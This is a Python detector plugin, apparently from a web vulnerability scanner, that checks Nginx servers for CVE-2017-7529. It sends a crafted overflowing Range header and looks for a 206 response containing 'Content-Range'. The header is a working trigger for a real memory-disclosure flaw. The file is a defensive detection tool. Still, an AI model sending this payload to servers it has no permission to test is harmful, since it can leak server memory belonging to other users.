from scanner.core.controller.plugin import DetectorPlugin
from scanner.knowledge_base.data_container.http.url import URL
from scanner.knowledge_base.data_container.http.headers import HTTPHeaders
from scanner.misc.utils.logger import singleton_logger as core_logger


class cve_2017_7529(DetectorPlugin):
	"""
	Detect CVE-2017-7529 (Nginx - Remote Integer Overflow Vulnerability)
	"""
	NAME = "CVE-2017-7529"
	CS_VULN_TEMPLATE_ID = "1000034"
	RESOURCE_TYPES = [ URL ]

	def detect(self, url):
		# First request, find response's content length
		http_request_1 = self.create_http_request(url=url)
		http_response_1 = self.requester.http.send(request=http_request_1)
		bytes_length = int(http_response_1.headers.get('Content-Length', 0))
		
		# Second request, calculate content length, run exploit
		range_header = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)
		headers = HTTPHeaders([
			('Range', range_header)
		])
		http_request_2 = self.create_http_request(url=url, headers=headers)
		http_response_2 = self.requester.http.send(request=http_request_2)

		# Check response
		if http_response_2.status_code == 206 and "Content-Range" in http_response_2.get_body():
			core_logger.info("Vulnerability is found: %s, URL=%r"%(self.get_name(), str(url)))
			attributes = {
				"range": range_header,
			}
			traffics = [
				http_response_1.id,
				http_response_2.id
			]
			core_logger.info("Vulnerability is found: %s, URL=%r"%(self.get_name(), str(url)))
			self.save_vuln(traffics=traffics, attributes=attributes)
			self.save_attribute(webserver="nginx", base_url=url)
